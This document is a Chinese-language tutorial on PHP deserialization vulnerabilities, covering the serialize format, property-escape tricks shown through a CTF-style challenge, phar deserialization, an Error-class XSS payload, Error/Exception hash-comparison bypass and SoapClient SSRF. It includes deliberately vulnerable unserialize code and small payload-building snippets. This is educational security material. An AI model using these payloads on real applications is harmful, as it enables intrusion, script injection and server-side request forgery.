反序列化

首先，先解释一下序列化和反序列化：

  • 序列化：序列化是将数据结构或对象转换为可存储或传输的格式的过程。在序列化期间，数据结构中的值被编码成字节序列，以便可以在网络上传输，或在文件中存储。可以将对象和数组转化为可储存和可传输的字符串。
  • 反序列化：反序列化与序列化相反，它将存储在一种特定格式的字节序列中的数据恢复为其原始的数据结构或对象。反序列化过程是将数据结构或对象还原为其内部表示形式的过程。
  • 优点：优点:这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性

基础介绍：

序列化与反序列化

在序列化中，所有格式的第一位都是数数据类型的英文字母简写，而且在结尾会加分号，如：

空字符：null——反序列化——N；
整型：666——反序列化——i:666;
字符串：hello——反序列化——s:5（5是字符串长度）:"hello";
boolen型：
true——反序列化——b:1;
false——反序列化——b:0;
数组：
array("aaa","bbb","ccc")——反序列化——a:3(数组长度):{i:0(第几个);s:3:"aaa";i:1;s:3:"bbb";i:2;s:3:"ccc";}

字符串的闭合不单是靠双引号，会双引号和长度共同判断

对象反序列化：

私有对象：

<?php
class test{
    private $a="aaaa";
    function shucu(){
        echo $a;
    }
}
$b=new test();
echo serialize($b);
?>
//输出结果：O:4(类名长度):"test"(类名):1(变量数量):{s:7:"testa"(变量名);s:4:"aaaa"(变量值);}

注意：private私有属性序列化时，在变量名前加”%00变量名%00”，类名也加”%00”。并且私有属性变量名前还会加上类名。

开放对象：

<?php
class test{
    public $a="aaaa";
    function shucu(){
        echo $a;
    }
}
$b=new test();
echo serialize($b);
?>
//输出结果：O:4:"hexo":1:{s:1:"a";s:4:"aaaa";}

开放类就不会加%00和在属性前加类名。

保护类对象:

<?php
class test{
    protected $a="aaaa";
    function shucu(){
        echo $a;
    }
}
$b=new test();
echo serialize($b);
?>
//输出结果：O:4:"test":1:{s:4:"*a";s:4:"aaaa";}

受保护的在变量名前多加一个%00*变量名%00，其他的不会多加.

反序列化特点：

  1. 反序列化后的内容为一个对象；
  2. 反序列化生成的对象里的值，有=由反序列化里的值提供；与原有类预定义的值无关。
  3. 反序列化不触发类的成员方法；需要调用方法后才触发。

反序列化漏洞成因：

反序列化的过程中，unserialize()接受的值(字符串)可控；通过更改这个值(字符串)，得到需要的代码，即生成对象的属性值。通过调用方法，执行代码。

常见位置

1.解析认证token、session的位置

2.将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等

3.将对象序列化后在网络中传输，如传输json数据，xml数据等

4.参数传递给程序

5.使用RMI协议，被广泛使用的RMI协议完全基于序列化

6.使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等

7.定义协议用来接收与发送原始的java对象

魔术方法

定义：魔术方法时一种预定好的，在特定情况下自动触发的行为方法

作用：在特定条件下自动调用相关方法，最终导致触发代码。

字符串逃逸

反序列化分隔符：

反序列化以;}结束，后边的字符不影响正常反序列化。

属性逃逸：

一般在数据先经过一次序列化，再经过反序列化，在这个中间反序列化的字符串变多或者变少的时候可能存在反序列化属性逃逸。

减少

在反序列化当中，解析是按成员属性的数量与属性值的长度值来解析的。假如你长度或数量不正确，那便无法正确解析。以下题为例：

?php
highlight_file(__FILE__);
error_reporting(0);
class A{
    public $v1 = "abcsystem()system()system()";
    public $v2 = '123';

    public function __construct($arga,$argc){
            $this->v1 = $arga;
            $this->v2 = $argc;
    }
}
$a = $_GET['v1'];
$b = $_GET['v2'];
$data = serialize(new A($a,$b));
$data = str_replace("system()","",$data);//将system()字符串替去掉。
var_dump(unserialize($data));
?>

在不输入任何值的情况下，他无法正常反序列化，在未经过对system()函数过滤的A的对象正常序列化为：

O:1:"A":2:{s:2:"v1";s:27:"abcsystem()system()system()";s:2:"v2";s:3:"123";}

但过滤之后为：

O:1:"A":2:{s:2:"v1";s:27:"abc";s:2:"v2";s:3:"123";}

在过滤之后，v1的值的长度未变,为27，但字符串变成了abc，所以他会吃掉后边的24个字符，所以无法解析，但是，反序列化以:}结束，通过这个特点，我们可以使其增加字符。下面演示操作：

假设我们想要增加一个v3，值为：givemeflag，那么我们要先写出我们需要增加的字符串的序列化：";S:2:"V3";s:10:"givemeflag";}。将这个设为v2的值，总体的序列化结果为：

O:1:"A":2:{s:2:"v1";s:27:|"abc";s:2:"v2";s:37:"1234567"|;S:2:"V3";s:10:"givemeflag";}";}

由于会吃掉24个字符，所以实际v1的值为两|中间的数。运行结果为：

phar反序列化原理

JAR是开发Java程序一个应用， 包括所有的可执行、可访问的文件，都打包进了一个JAR文件里,使得部署过程:十分简单。

PHAR (“Php ARchive”)是PHP里类似于JAR的一-种打包文件。对于PHP 5.3或更高版本，Phar后缀文件是默认开启支持的，可以直接使用它。文件包含: phar伪协议，可读取.phar文件。

phar结构：

  • stub phar文件标识，格式为xxx; (头部信息)
  • manifest压缩文件的属性等信息，以序列化存储;
  • contents压缩文件的内容;
  • signature签名，放在文件末尾;

报错类

使用 Error/Exception 内置类进行 XSS

Error 内置类

  • 适用于php7版本
  • 在开启报错的情况下

Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 __toString() 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，当 PHP 对象被当作一个字符串输出或使用时候（如echo的时候）会触发__toString 方法，例题如下：

<?php
$a = unserialize($_GET['whoami']);
echo $a;
?>

在这道题目当中，没有可共我们所够造的类，于是只能考虑原生类。可以得出以下解法：

$a = new Error("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);  
?>

Error/Exception 绕过哈希比较

在这两个原生类当中，我们可以看到，在Error和Exception这两个PHP原生类中内只有 __toString 方法，这个方法用于将异常或错误对象转换为字符串。当其报错时，将会以字符串的形式输出当前报错。如下例：

<?php
$a = new Error("payload",1);$b = new Error("payload",2);
echo $a;
echo "\r\n\r\n";
echo $b;

输出结果：

Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}

Error: payload in /usercode/file.php:2
Stack trace:
#0 {main}

此处可以看出，a与b的错误点是不同的，但返回的却还是相同的，真正的错误点没有返回。此点性质在绕过哈希比较时是非常有用的。

SoapClient 类

PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。

该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。该类的构造函数如下：

public SoapClient :: SoapClient(mixed $wsdl [，array $options ])

参数解释：

  • 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。
  • 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。
